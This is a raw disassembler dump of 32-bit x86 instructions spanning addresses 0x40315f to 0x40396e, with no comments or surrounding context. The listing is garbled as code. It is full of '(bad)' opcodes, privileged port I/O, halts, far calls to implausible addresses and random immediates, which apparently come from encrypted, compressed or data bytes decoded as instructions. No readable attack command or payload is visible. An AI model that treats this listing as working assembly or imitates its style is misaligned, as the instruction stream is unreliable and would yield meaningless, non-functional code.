  40315f:	inc    esp
  403160:	and    al,0x9d
  403162:	cs mov dl,0x91
  403165:	and    DWORD PTR [edx],0x3e0112cc
  40316b:	adc    BYTE PTR [edx],bl
  40316d:	sub    al,0x3
  40316f:	xor    cl,BYTE PTR [edx]
  403171:	mov    al,0xce
  403173:	mov    esi,0xc39d483a
  403178:	push   ds
  403179:	loopne 0x403118
  40317b:	sar    edx,cl
  40317d:	jb     0x40310e
  40317f:	cmp    esp,edi
  403181:	and    al,0x44
  403183:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403185:	dec    edi
  403186:	arpl   WORD PTR [edi-0x7c1ff4a8],di
  40318c:	push   ecx
  40318d:	jno    0x403166
  40318f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403190:	in     al,dx
  403191:	scas   eax,DWORD PTR es:[edi]
  403192:	test   BYTE PTR ds:0xf4072771,dh
  403198:	bnd jne 0x403155
  40319b:	scas   eax,DWORD PTR es:[edi]
  40319c:	jecxz  0x40315d
  40319e:	pop    esi
  40319f:	push   ebx
  4031a0:	outs   dx,DWORD PTR ds:[esi]
  4031a1:	das    
  4031a2:	imul   eax,eax,0x15
  4031a5:	into   
  4031a6:	mov    BYTE PTR [eax+edi*8-0x1eedf6e8],ch
  4031ad:	cmp    ch,BYTE PTR [esi-0x78]
  4031b0:	fsub   DWORD PTR [edi]
  4031b2:	test   eax,0x36fc08c
  4031b7:	jp     0x4031df
  4031b9:	lds    ebp,FWORD PTR [ecx]
  4031bb:	(bad)
  4031bf:	shl    ebp,cl
  4031c1:	mov    ds:0x9fe5202b,eax
  4031c6:	mov    ecx,0x8d688d38
  4031cb:	pop    ds
  4031cc:	inc    ebp
  4031cd:	xchg   esi,eax
  4031ce:	and    bl,al
  4031d0:	xchg   ebp,eax
  4031d1:	push   ebx
  4031d2:	cmp    DWORD PTR [ecx-0x6a],edx
  4031d5:	xor    BYTE PTR [edx+0xbcb3234],bh
  4031db:	call   DWORD PTR [eax]
  4031dd:	shl    al,1
  4031df:	pop    ss
  4031e0:	bound  ebx,QWORD PTR [esi*8-0x22f7204a]
  4031e7:	and    al,0xec
  4031e9:	sub    eax,0xbf087a3b
  4031ee:	add    bl,BYTE PTR [ebx-0x49]
  4031f1:	imul   esp,DWORD PTR [edi],0xb2996d8d
  4031f7:	daa    
  4031f8:	nop
  4031f9:	std    
  4031fa:	add    BYTE PTR [ecx+0x2db22c0b],ch
  403200:	rcr    DWORD PTR [esi-0x65d1968f],1
  403206:	aas    
  403207:	add    BYTE PTR [ebp+ebx*1+0x20],dl
  40320b:	outs   dx,BYTE PTR ds:[esi]
  40320c:	data16 sahf 
  40320e:	loope  0x4031b3
  403210:	adc    bh,bh
  403212:	cwde   
  403213:	bound  esi,QWORD PTR [eax+0x45]
  403216:	ficom  DWORD PTR [ebp-0x61]
  403219:	dec    ebx
  40321a:	push   ebp
  40321b:	dec    ebp
  40321c:	in     al,0x74
  40321e:	mov    eax,ds:0x22de4f8f
  403223:	pop    ecx
  403224:	aaa    
  403225:	(bad)  
  403226:	fldenv [edx+ebx*1+0x588879e9]
  40322d:	rcr    BYTE PTR [edx-0x121d09bb],0xe4
  403234:	mov    al,0xa
  403236:	and    BYTE PTR [esi+ecx*2],0x49
  40323a:	jb     0x40325f
  40323c:	adc    al,0x3a
  40323e:	in     al,0x1c
  403240:	out    dx,al
  403241:	dec    ebx
  403242:	(bad)  
  403243:	pop    edx
  403244:	mov    edi,0x5276b61c
  403249:	pop    ds
  40324a:	mov    edx,0x1ab12dec
  40324f:	dec    edx
  403250:	popa   
  403251:	dec    edx
  403252:	rcr    esp,0xa3
  403255:	dec    esi
  403256:	int3   
  403257:	add    eax,0x72609201
  40325c:	sbb    eax,DWORD PTR [ecx]
  40325e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40325f:	fucomp st(1)
  403261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403262:	sub    al,0x69
  403264:	std    
  403265:	lods   eax,DWORD PTR ds:[esi]
  403266:	xchg   esi,eax
  403267:	leave  
  403268:	jmp    0x4032b7
  40326a:	xor    DWORD PTR [edx-0x47],0xd0481c30
  403271:	pop    esp
  403272:	dec    ecx
  403273:	adc    ecx,ebx
  403275:	lods   eax,DWORD PTR ds:[esi]
  403276:	jmp    0x8bb38a3
  40327b:	pop    edx
  40327c:	int    0x25
  40327e:	pop    dx
  403280:	sub    eax,0xcb187fe6
  403285:	xchg   edx,eax
  403286:	clc    
  403287:	or     al,0x6a
  403289:	shl    DWORD PTR [edi-0x11],1
  40328c:	aad    0x9c
  40328e:	std    
  40328f:	mov    ds:0xd7ab240c,al
  403294:	add    DWORD PTR [ecx+edx*8-0x31534379],esp
  40329b:	mov    ds:0xb94ee91,al
  4032a0:	mov    al,0x4e
  4032a2:	sbb    eax,0x8b7f5c8c
  4032a7:	call   0xa8e1e7e3
  4032ac:	rcl    bl,1
  4032ae:	mov    dh,0x97
  4032b0:	push   eax
  4032b1:	adc    ah,dh
  4032b3:	add    BYTE PTR [edx+0x1b],bh
  4032b6:	test   dh,0xcc
  4032b9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032bb:	stos   DWORD PTR es:[edi],eax
  4032bc:	cmc    
  4032bd:	xchg   esp,eax
  4032be:	test   BYTE PTR [esi],ch
  4032c0:	dec    ebp
  4032c1:	dec    esp
  4032c2:	mov    ebx,0x33791d3
  4032c7:	lods   eax,DWORD PTR ds:[esi]
  4032c8:	imul   eax,eax,0xf525d49e
  4032ce:	call   0x1695d7b2
  4032d3:	das    
  4032d4:	loope  0x4032b8
  4032d6:	adc    al,0xc
  4032d8:	xor    al,0x71
  4032da:	sbb    BYTE PTR [ebx+0x55dbadb1],ch
  4032e0:	popf   
  4032e1:	jg     0x4032bc
  4032e3:	jbe    0x403272
  4032e5:	or     DWORD PTR [ebx+0x7cccd381],0xd4b95b5b
  4032ef:	imul   ebx,DWORD PTR [esi+0x4b],0xfffffff9
  4032f3:	jno    0x403300
  4032f5:	sbb    DWORD PTR [eax],eax
  4032f7:	mov    BYTE PTR [esi],cl
  4032f9:	dec    ebx
  4032fa:	sub    al,0xa8
  4032fc:	rol    BYTE PTR [ecx+0x4b],cl
  4032ff:	sub    ebx,esi
  403301:	inc    eax
  403302:	dec    edx
  403303:	inc    esi
  403304:	push   edx
  403305:	cli    
  403306:	js     0x9c6155f0
  40330c:	out    0xce,eax
  40330e:	loope  0x4032e4
  403310:	(bad)  
  403311:	icebp  
  403312:	push   ebx
  403313:	mov    al,0x14
  403315:	jae    0x403308
  403317:	pop    ebx
  403318:	outs   dx,BYTE PTR ds:[esi]
  403319:	push   edx
  40331a:	ror    DWORD PTR [edx-0x18e8ae46],0x21
  403321:	mul    BYTE PTR [ebx+ecx*8+0x1f2a7170]
  403328:	es pop ebx
  40332a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40332b:	mov    edi,0x6eecf861
  403330:	and    edx,DWORD PTR [ebx-0x2d99753e]
  403336:	imul   edi,DWORD PTR [edx],0x719b7a03
  40333c:	lahf   
  40333d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40333e:	cmp    ch,BYTE PTR [ebx+0x1f]
  403341:	inc    ebx
  403342:	push   ebx
  403343:	fistp  QWORD PTR [ecx-0x53]
  403346:	shl    DWORD PTR ds:0xa94005f,cl
  40334c:	cmp    al,BYTE PTR [esi-0x24]
  40334f:	fs (bad) 
  403351:	call   0xd535:0xf3de2704
  403358:	cmp    ecx,DWORD PTR [esi+0x76]
  40335b:	out    dx,al
  40335c:	shl    BYTE PTR [esp+ebp*1+0xefb5117],cl
  403363:	daa    
  403364:	out    dx,eax
  403365:	(bad)  
  403366:	in     al,0xf8
  403368:	ds inc ebp
  40336a:	mov    eax,0xd931589a
  40336f:	lahf   
  403370:	int3   
  403371:	stc    
  403372:	mov    ds:0x8356e7d2,al
  403377:	std    
  403378:	imul   ebx,DWORD PTR cs:[ecx+0x3f],0xffffffec
  40337d:	repz jge 0x40338c
  403380:	add    eax,0xc478682b
  403385:	(bad)  [esi]
  403387:	pushf  
  403388:	dec    edi
  403389:	scas   al,BYTE PTR es:[edi]
  40338a:	fst    QWORD PTR [esi+0x491c25fc]
  403390:	pop    ds
  403391:	stos   DWORD PTR es:[edi],eax
  403392:	repnz or edi,DWORD PTR [eax-0x974d5db]
  403399:	mov    ch,0x8f
  40339b:	push   0x4b
  40339d:	inc    ebx
  40339e:	ret    
  40339f:	les    edx,FWORD PTR [edx+0x257db97b]
  4033a5:	(bad)  
  4033a6:	pusha  
  4033a7:	pop    es
  4033a8:	outs   dx,DWORD PTR ds:[esi]
  4033a9:	cmp    DWORD PTR [edx+eax*1+0x3c],0xffffff98
  4033ae:	not    BYTE PTR [edx]
  4033b0:	ja     0x4033ab
  4033b2:	fstp   DWORD PTR [ebp+0x56]
  4033b5:	jmp    0xc753d47
  4033ba:	mov    ds:0x7886f9df,al
  4033bf:	inc    ebp
  4033c0:	mov    ebx,0xdb7432de
  4033c5:	pop    eax
  4033c6:	imul   ebx,DWORD PTR [eax-0x4a0bd65c],0x96d29c1b
  4033d0:	mov    cl,0x72
  4033d2:	mov    eax,ds:0x60e0416d
  4033d7:	aad    0x53
  4033d9:	add    bl,BYTE PTR [ecx-0x6be89320]
  4033df:	hlt    
  4033e0:	(bad)  
  4033e1:	mov    ebp,0xcd744aba
  4033e6:	imul   ecx,DWORD PTR [esi-0x3328ad73],0x8b7e823e
  4033f0:	or     ebx,DWORD PTR [eax-0x2bebfe55]
  4033f6:	mov    edx,0xe125cd5
  4033fb:	data16 fs out dx,al
  4033fe:	sti    
  4033ff:	aaa    
  403400:	inc    dh
  403402:	mov    al,BYTE PTR ds:0xddf57500
  403408:	js     0x403406
  40340a:	push   esp
  40340b:	xor    al,0x43
  40340d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40340e:	or     dh,BYTE PTR [ebx-0x21b7ccad]
  403414:	push   edi
  403415:	mov    bl,0x13
  403417:	push   edx
  403418:	mov    ah,0x8a
  40341a:	adc    BYTE PTR [eax+0x5d8344d7],dl
  403420:	in     eax,dx
  403421:	pop    edi
  403423:	mov    edx,0x86e77412
  403428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403429:	leave  
  40342a:	mov    eax,0x7ae792e3
  40342f:	stos   BYTE PTR es:[edi],al
  403430:	cmp    eax,0x2f2c0e58
  403435:	dec    eax
  403436:	mov    eax,ds:0x29e14b89
  40343b:	pop    ds
  40343c:	cli    
  40343d:	cmp    dh,BYTE PTR [eax]
  40343f:	xor    BYTE PTR [edi+ebx*2],dl
  403442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403443:	inc    DWORD PTR [ebx-0x7c]
  403446:	bound  ebx,QWORD PTR [ecx-0x43]
  403449:	aad    0xd8
  40344b:	es ins BYTE PTR es:[edi],dx
  40344d:	jecxz  0x4034ba
  40344f:	stc    
  403450:	or     al,0x71
  403452:	es jnp 0x4034a1
  403455:	rcr    BYTE PTR [ecx+0x72721e04],1
  40345b:	pusha  
  40345c:	aam    0x94
  40345e:	or     eax,0xb30a7c2b
  403463:	out    dx,eax
  403464:	cli    
  403465:	inc    eax
  403466:	arpl   WORD PTR [esi+0x50],si
  403469:	add    dl,bh
  40346b:	aam    0xd5
  40346d:	inc    edi
  40346e:	adc    al,0x52
  403470:	inc    ebp
  403471:	test   eax,0xa68253ed
  403476:	push   ecx
  403477:	push   eax
  403478:	and    ah,BYTE PTR [eax-0x5d]
  40347b:	cs dec esi
  40347d:	sub    esp,DWORD PTR [ebx+0x4c]
  403480:	fcmovnbe st,st(1)
  403482:	jb     0x40342d
  403484:	mov    bh,0x52
  403486:	push   ebp
  403487:	imul   ecx,DWORD PTR [edx],0x54
  40348a:	dec    eax
  40348b:	xchg   DWORD PTR [edx],edx
  40348d:	push   ebx
  40348e:	xchg   edx,eax
  40348f:	icebp  
  403490:	cmp    al,0xad
  403492:	cs pusha 
  403494:	popa   
  403495:	in     al,0x47
  403497:	int3   
  403498:	and    edx,eax
  40349a:	dec    ecx
  40349b:	sub    bh,BYTE PTR [edi]
  40349d:	in     al,0xf3
  40349f:	inc    esp
  4034a0:	test   eax,0x7aec2e11
  4034a5:	stos   DWORD PTR es:[edi],eax
  4034a6:	push   ebp
  4034a7:	mov    esi,0xc507a04f
  4034ac:	or     DWORD PTR [eax+edx*4+0x20],0x86343938
  4034b4:	cmc    
  4034b5:	out    0xb1,eax
  4034b7:	fistp  DWORD PTR [ebp+0x75]
  4034ba:	idiv   DWORD PTR [esi]
  4034bc:	jae    0x403525
  4034be:	cli    
  4034bf:	sar    BYTE PTR [edx],1
  4034c1:	sbb    al,0x64
  4034c3:	stc    
  4034c4:	iret   
  4034c5:	dec    edi
  4034c6:	pop    ecx
  4034c7:	cmp    BYTE PTR [esi+ebp*1+0x1dc81386],dh
  4034ce:	clc    
  4034cf:	sbb    al,0xbc
  4034d1:	cmc    
  4034d2:	inc    esp
  4034d3:	pop    ebx
  4034d4:	fild   WORD PTR [ebx+0x7b78e96a]
  4034da:	dec    edi
  4034db:	add    ebp,DWORD PTR [ebp+edx*4+0x75ebc259]
  4034e2:	mov    ?,WORD PTR [eax+0x39]
  4034e5:	adc    ch,BYTE PTR [edx-0x12]
  4034e8:	pusha  
  4034e9:	(bad)  [esi-0x4c01c75]
  4034ef:	les    ebp,FWORD PTR [ebx-0x101980e9]
  4034f5:	jmp    0x2a3af11f
  4034fa:	outs   dx,BYTE PTR ds:[esi]
  4034fb:	aam    0x9f
  4034fd:	add    DWORD PTR [eax-0x35],ecx
  403500:	cmp    esi,DWORD PTR [ebx+eax*1+0x53]
  403504:	stos   BYTE PTR es:[edi],al
  403505:	dec    ebx
  403506:	sub    BYTE PTR [edx-0x118d4b7d],bl
  40350c:	jg     0x4034d8
  40350e:	add    al,0x42
  403510:	hlt    
  403511:	dec    ecx
  403512:	dec    ebp
  403513:	pushf  
  403514:	jg     0x4034f4
  403516:	inc    ecx
  403517:	lahf   
  403518:	arpl   bp,cx
  40351a:	fidivr WORD PTR fs:[eax+0x4a62d6d0]
  403521:	pop    es
  403522:	adc    BYTE PTR [edx+0x69],ah
  403525:	jp     0x40359a
  403527:	in     al,0x6e
  403529:	cmp    bh,BYTE PTR [eax]
  40352b:	stos   BYTE PTR es:[edi],al
  40352c:	fistp  WORD PTR ds:0xa8b5206e
  403532:	or     eax,0xa22b86af
  403537:	add    eax,0x1f78c1b8
  40353c:	pop    ebp
  40353d:	pop    ds
  40353e:	retf   0x42e9
  403541:	pop    ss
  403542:	imul   edx,DWORD PTR [ebp+0x51],0x20
  403546:	jb     0x4035c6
  403548:	lock inc edi
  40354a:	lea    esi,[edi]
  40354c:	mov    eax,ds:0xa92c31f
  403551:	icebp  
  403552:	mov    bl,0x20
  403554:	push   edx
  403555:	sub    BYTE PTR [esi-0x20],dl
  403558:	pop    ebx
  403559:	dec    ebp
  40355a:	popa   
  40355b:	aas    
  40355c:	icebp  
  40355d:	inc    esp
  40355e:	loop   0x40355d
  403560:	das    
  403561:	jl     0x4035af
  403563:	jns    0x4035c5
  403565:	mov    ecx,0x36d4f16f
  40356a:	jp     0x4034f0
  40356c:	jb     0x4035d4
  40356e:	jo     0x403550
  403570:	mov    ebp,0x8abeaf68
  403575:	inc    esp
  403576:	pop    ss
  403577:	push   edx
  403578:	retf   
  403579:	stos   BYTE PTR es:[edi],al
  40357a:	mov    ds:0xd3dc0e4e,eax
  40357f:	mov    dl,0x49
  403581:	and    eax,0x39ea3dfb
  403587:	push   cs
  403588:	ret    
  403589:	or     edi,DWORD PTR [edx-0x121bde25]
  40358f:	add    eax,0xb76c2b24
  403594:	pop    ecx
  403595:	int3   
  403596:	dec    ebp
  403597:	mov    WORD PTR [esi+0x26],fs
  40359a:	mov    BYTE PTR [ebp+0x575f369a],bh
  4035a0:	or     ebx,DWORD PTR [edi+0x17f21a19]
  4035a6:	mov    edi,0x2d95f4bc
  4035ab:	xchg   edi,eax
  4035ac:	sar    BYTE PTR [ecx+ecx*2],cl
  4035af:	mov    edx,0xcc776753
  4035b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035b5:	or     BYTE PTR [ebx-0x77],0xcc
  4035b9:	mov    ebp,DWORD PTR ds:0xc518c52d
  4035bf:	mul    BYTE PTR [esi-0x19cfe168]
  4035c5:	add    BYTE PTR [ebp-0x4669269a],dh
  4035cb:	adc    al,0x39
  4035cd:	retf   
  4035ce:	pop    ecx
  4035cf:	sbb    ebx,DWORD PTR [edx-0x6e00506e]
  4035d5:	pop    es
  4035d6:	push   eax
  4035d7:	sahf   
  4035d8:	test   al,0x9c
  4035da:	inc    ebx
  4035db:	sbb    edx,ecx
  4035dd:	test   eax,0x6caad0de
  4035e2:	shl    DWORD PTR [edx+ecx*8-0xa],0x98
  4035e7:	fcomp  QWORD PTR [ecx+0x6c]
  4035ea:	call   0xbff9:0xf34a8457
  4035f1:	jbe    0x40358f
  4035f3:	adc    al,BYTE PTR [esp+esi*2+0x7c]
  4035f7:	mov    ebp,0xb1ddf4f5
  4035fc:	(bad)  
  4035fd:	fadd   DWORD PTR [edx+ebx*4-0x10de47c1]
  403604:	cmp    DWORD PTR [eax-0xb45b636],0xd4b7384e
  40360e:	loop   0x403687
  403610:	pop    ebp
  403611:	and    edi,DWORD PTR [edx-0x46]
  403614:	ins    BYTE PTR es:[edi],dx
  403615:	mov    eax,ds:0x96878e8b
  40361a:	sahf   
  40361b:	sub    BYTE PTR [edi-0x4a749683],ch
  403621:	cmp    esp,edi
  403623:	enter  0xb65e,0xd9
  403627:	dec    eax
  403628:	adc    esp,ebx
  40362a:	sub    BYTE PTR [edx+0x4f0d90cd],0x19
  403631:	add    ecx,esi
  403633:	push   0xa732bbd4
  403638:	push   0xf0a12cc0
  40363d:	inc    edi
  40363e:	test   DWORD PTR [ebp+0x37a0295b],eax
  403644:	adc    BYTE PTR [edi-0x51],bh
  403647:	sub    edx,ebx
  403649:	xchg   esp,eax
  40364a:	cmp    eax,0xc638b234
  40364f:	mov    esp,0xbe2d901b
  403654:	das    
  403655:	and    BYTE PTR [ebx+0x3d],bl
  403658:	pop    edx
  403659:	adc    ch,bh
  40365b:	icebp  
  40365c:	repnz mov ah,0x8e
  40365f:	dec    ebx
  403660:	mov    BYTE PTR [edx-0x603f0c73],bl
  403666:	jmp    0x4036bb
  403668:	loopne 0x403643
  40366a:	jmp    0x5793e41a
  40366f:	int    0x9a
  403671:	popa   
  403672:	xor    eax,0x6f2c8294
  403677:	and    al,BYTE PTR [esi-0x1b]
  40367a:	es dec edx
  40367c:	mov    cl,bh
  40367e:	push   es
  40367f:	mov    ebx,0xe99f66db
  403684:	daa    
  403685:	(bad)  
  403686:	pop    ebx
  403687:	push   0x45
  403689:	push   edx
  40368a:	pop    ebx
  40368b:	mov    ch,BYTE PTR [ebx]
  40368d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40368e:	push   edi
  40368f:	sbb    al,0x47
  403691:	ror    DWORD PTR [eax+0xc],1
  403694:	hlt    
  403695:	ror    DWORD PTR [eax],cl
  403697:	div    BYTE PTR [edi]
  403699:	fcomp  DWORD PTR [esi+0x3f8ecb6b]
  40369f:	jmp    0xcdd4687d
  4036a4:	sbb    BYTE PTR [ebx],ch
  4036a6:	inc    ebx
  4036a7:	cmp    DWORD PTR [edi+eiz*2+0x73764aad],esi
  4036ae:	sbb    al,0x21
  4036b0:	jo     0x4036d6
  4036b2:	lea    esi,[ebp-0x7c7ce84a]
  4036b8:	sbb    bh,BYTE PTR [ebx-0x25277bfd]
  4036be:	xchg   ebp,eax
  4036bf:	inc    eax
  4036c0:	daa    
  4036c1:	imul   ebp,esi,0x8e7b35a0
  4036c7:	ret    0xec3c
  4036ca:	ror    DWORD PTR [esi+0x16],cl
  4036cd:	adc    DWORD PTR [esi],ecx
  4036cf:	pop    eax
  4036d0:	inc    esi
  4036d1:	or     al,0x47
  4036d3:	cmp    esi,DWORD PTR [ebp+0x52]
  4036d6:	add    ecx,DWORD PTR [ebp+ebp*1+0x399f83c8]
  4036dd:	cmc    
  4036de:	test   BYTE PTR [eax+0x24d2c7c4],0x9a
  4036e5:	mov    dh,0xa8
  4036e7:	adc    esi,edi
  4036e9:	fst    DWORD PTR [ebx]
  4036eb:	mov    ds:0x5e1195e9,eax
  4036f0:	ins    DWORD PTR es:[edi],dx
  4036f1:	aam    0x44
  4036f3:	je     0x40376a
  4036f5:	inc    eax
  4036f6:	retf   0xd42c
  4036f9:	inc    esp
  4036fa:	jmp    0x403705
  4036fc:	cli    
  4036fd:	fld    DWORD PTR gs:[edx]
  403700:	mov    ebx,0x9cb06348
  403705:	dec    ebx
  403706:	(bad)  
  403707:	std    
  403708:	mov    ebx,DWORD PTR [edx-0x237a561d]
  40370e:	in     al,0xc3
  403710:	jg     0x403782
  403712:	or     eax,0xf14e07ae
  403717:	out    dx,al
  403718:	into   
  403719:	das    
  40371a:	(bad)  
  40371b:	popf   
  40371c:	sbb    ecx,0x51
  40371f:	(bad)  
  403720:	stos   BYTE PTR es:[edi],al
  403721:	aas    
  403722:	out    0xea,al
  403724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403725:	dec    esi
  403726:	push   0xce12f33c
  40372b:	test   ch,ah
  40372d:	out    dx,eax
  40372e:	push   ebx
  40372f:	cmc    
  403730:	cmp    bh,al
  403732:	add    BYTE PTR [edx],0x6b
  403735:	test   BYTE PTR [ebp-0x4d],ah
  403738:	and    bh,BYTE PTR [edx+0x2f39ccef]
  40373e:	xor    DWORD PTR [ecx],edi
  403740:	and    ebx,DWORD PTR [esi+0x5c9fac1b]
  403746:	ficom  DWORD PTR [edi-0x27ff210b]
  40374c:	pop    edx
  40374d:	aaa    
  40374e:	push   cs
  40374f:	imul   edi,DWORD PTR [esp+ecx*2-0x3d5b71d],0x8b143bc
  40375a:	dec    ecx
  40375b:	mov    gs,WORD PTR [ecx]
  40375d:	or     DWORD PTR [esi],ecx
  40375f:	adc    edx,DWORD PTR [ebx]
  403761:	ss pop es
  403763:	sub    DWORD PTR [ecx],ebp
  403765:	les    eax,FWORD PTR [ecx+edi*8+0x41]
  403769:	imul   edx,DWORD PTR [ecx],0xf364af95
  40376f:	ret    0x82fa
  403772:	add    al,0xc7
  403774:	fidivr WORD PTR [ebp+0x3612f756]
  40377a:	rcr    DWORD PTR [edi-0x1304645e],0x57
  403781:	shr    DWORD PTR [ecx-0x1b],0x54
  403785:	xchg   ax,ax
  403787:	mov    ebp,0x178e3fb0
  40378c:	mov    ch,0xfa
  40378e:	mov    ecx,0xa0bcda38
  403793:	aam    0x39
  403795:	aaa    
  403796:	loop   0x403765
  403798:	mov    edi,0x28846a7d
  40379d:	popf   
  40379e:	rcr    BYTE PTR [eax],0x64
  4037a1:	retf   0xc9cf
  4037a4:	mov    esi,0x15f7b9a3
  4037a9:	ins    BYTE PTR es:[edi],dx
  4037aa:	fmul   QWORD PTR [ecx+0x1b]
  4037ad:	add    ebx,DWORD PTR [ecx+0x54]
  4037b0:	call   0x2f45:0x9b481264
  4037b7:	cs mov ch,0xf
  4037ba:	push   eax
  4037bb:	mov    eax,fs:0x94ba1f38
  4037c1:	jo     0x403792
  4037c3:	nop
  4037c4:	sub    edx,DWORD PTR [edx-0x1b]
  4037c7:	mov    ebx,0x19bebd0f
  4037cc:	arpl   sp,di
  4037ce:	fidiv  WORD PTR [eax-0x1cd6d4f3]
  4037d4:	cmovne ebx,DWORD PTR [edi]
  4037d7:	jbe    0x40377a
  4037d9:	add    al,0x4f
  4037db:	or     BYTE PTR [esi],dh
  4037dd:	mov    dl,0xc2
  4037df:	inc    esp
  4037e0:	mov    esp,DWORD PTR [edi]
  4037e2:	(bad)  
  4037e3:	xor    esp,esi
  4037e5:	rol    edi,cl
  4037e7:	adc    DWORD PTR [ecx],esi
  4037e9:	adc    eax,eax
  4037eb:	stc    
  4037ec:	cld    
  4037ed:	mov    edx,0xbe06c154
  4037f2:	fadd   QWORD PTR [edi+0x1ef8f8e4]
  4037f8:	mov    dh,0x88
  4037fa:	into   
  4037fb:	jbe    0x4037a5
  4037fd:	pop    edi
  4037fe:	push   eax
  4037ff:	pop    edi
  403800:	sub    al,0xff
  403802:	sbb    esi,ecx
  403804:	xchg   DWORD PTR [eax-0x4f],eax
  403807:	test   BYTE PTR [esi-0x1e],0x9e
  40380b:	cmp    BYTE PTR [esp+esi*1],dh
  40380e:	push   0xf6083f5d
  403813:	mov    ebx,0xc84bab0a
  403818:	int    0x6d
  40381a:	jns    0x403860
  40381c:	jns    0x403888
  40381e:	repnz push cs
  403820:	addr16 rcl ah,0x4c
  403824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403825:	cli    
  403826:	xor    edx,DWORD PTR [eax+0x53]
  403829:	cmp    DWORD PTR [ebx],edi
  40382b:	aad    0x3d
  40382d:	cwde   
  40382e:	call   0x2c0e:0x1302ae10
  403835:	mov    ebx,0xbf92515d
  40383a:	loopne 0x403890
  40383c:	pop    eax
  40383d:	fist   WORD PTR [edx-0x68273aaa]
  403843:	std    
  403844:	push   esi
  403845:	mov    esi,0x6110f85a
  40384a:	mov    al,0x69
  40384c:	mov    ch,0x40
  40384e:	int    0xe4
  403850:	xor    ecx,esi
  403852:	dec    DWORD PTR [edx]
  403854:	(bad)  
  403855:	pop    esi
  403856:	rcr    DWORD PTR [edx+0x11],1
  403859:	pushf  
  40385a:	shl    DWORD PTR [edx],cl
  40385c:	loop   0x403813
  40385e:	xchg   ebx,eax
  40385f:	(bad)  
  403861:	cmp    bh,BYTE PTR [edx+0x5ae5a1c8]
  403867:	into   
  403868:	jmp    0x403821
  40386a:	mov    al,0xb
  40386c:	jl     0x403812
  40386e:	mov    cl,0xa2
  403870:	jbe    0x40389c
  403872:	mov    ch,BYTE PTR [edx+0x3838d27a]
  403878:	data16 int 0x1b
  40387b:	add    DWORD PTR [edx+eiz*2],esp
  40387e:	or     al,BYTE PTR ds:[edx+0x6a667327]
  403885:	xlat   BYTE PTR ds:[ebx]
  403886:	repz aam 0x52
  403889:	out    dx,al
  40388a:	es sbb dl,ch
  40388d:	sahf   
  40388e:	hlt    
  40388f:	mov    ecx,0xe4fa3ba2
  403894:	scas   eax,DWORD PTR es:[edi]
  403895:	add    DWORD PTR [eax-0x674dcce1],esp
  40389b:	mov    ecx,0xdb8fa830
  4038a0:	inc    ecx
  4038a1:	xchg   esi,eax
  4038a2:	push   ebp
  4038a3:	fcomp  DWORD PTR [ebx+0x7a4efb54]
  4038a9:	test   eax,0x4eaef2e1
  4038ae:	or     al,BYTE PTR [edx-0x44]
  4038b1:	jmp    0x3e59:0x5b4818c0
  4038b8:	in     al,0x9
  4038ba:	lock xor BYTE PTR [edi],ah
  4038bd:	adc    ch,BYTE PTR [esi+edx*8]
  4038c0:	push   ebp
  4038c1:	pop    edi
  4038c2:	std    
  4038c3:	in     eax,dx
  4038c4:	xchg   DWORD PTR [edi+eiz*8],ebp
  4038c7:	add    ebx,edi
  4038c9:	ja     0x403893
  4038cb:	mov    BYTE PTR [edi-0x4c7d1ec1],bl
  4038d1:	fld    QWORD PTR [eax+0x66025ff2]
  4038d7:	sub    cl,0xd1
  4038da:	xchg   ebx,eax
  4038db:	push   ebx
  4038dc:	mov    al,0xf0
  4038de:	sub    bl,BYTE PTR [esi+0x65]
  4038e1:	leave  
  4038e2:	loope  0x4038b1
  4038e4:	and    DWORD PTR [edi-0x55],ebx
  4038e7:	jp     0x4038ff
  4038e9:	aam    0x30
  4038eb:	mov    ch,0xcb
  4038ed:	inc    edx
  4038ee:	mov    bl,0xb6
  4038f0:	mov    dh,0x48
  4038f2:	sbb    eax,0xc0a9e4da
  4038f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038f8:	or     eax,0x8f58c5d
  4038fd:	or     al,0xc4
  4038ff:	jnp    0x403904
  403901:	mov    bh,0x34
  403903:	or     esi,esi
  403905:	fstp   DWORD PTR ds:0x2f1ca07f
  40390b:	xchg   ecx,eax
  40390c:	scas   eax,DWORD PTR es:[edi]
  40390d:	dec    edx
  40390e:	aaa    
  40390f:	stos   BYTE PTR es:[edi],al
  403910:	fild   WORD PTR [ecx+0x3e]
  403913:	add    edx,DWORD PTR [eax-0x5546381d]
  403919:	adc    DWORD PTR [ecx],ebp
  40391b:	and    al,0x70
  40391d:	mov    esi,0xe05a94fc
  403922:	shr    DWORD PTR [edx-0x330dd445],1
  403928:	cmp    eax,DWORD PTR [edx]
  40392a:	jg     0x403928
  40392c:	sbb    DWORD PTR [ebx+0x6f],edx
  40392f:	ret    0x514e
  403932:	add    esi,ebx
  403934:	sbb    BYTE PTR [esi],bh
  403936:	cmp    al,0x36
  403938:	mov    edi,0xecadac5c
  40393d:	(bad)  
  40393e:	xor    DWORD PTR [esi],esp
  403940:	out    dx,al
  403941:	and    ah,dh
  403943:	and    bh,al
  403945:	aad    0x40
  403947:	out    0x13,al
  403949:	sti    
  40394a:	adc    DWORD PTR [edx],esp
  40394c:	lods   al,BYTE PTR ds:[esi]
  40394d:	test   DWORD PTR [edi],0xbaad9a99
  403953:	int    0x40
  403955:	dec    edi
  403956:	call   0x44f8:0x9e436cf9
  40395d:	pop    es
  40395e:	pop    eax
  40395f:	std    
  403960:	(bad)  
  403961:	xchg   ebp,eax
  403962:	push   es
  403963:	pop    es
  403964:	and    al,0x32
  403966:	leave  
  403967:	ss inc esp
  403969:	aas    
  40396a:	arpl   WORD PTR [edi],sp
  40396c:	aad    0x0
  40396e:	jnp    0x40394b
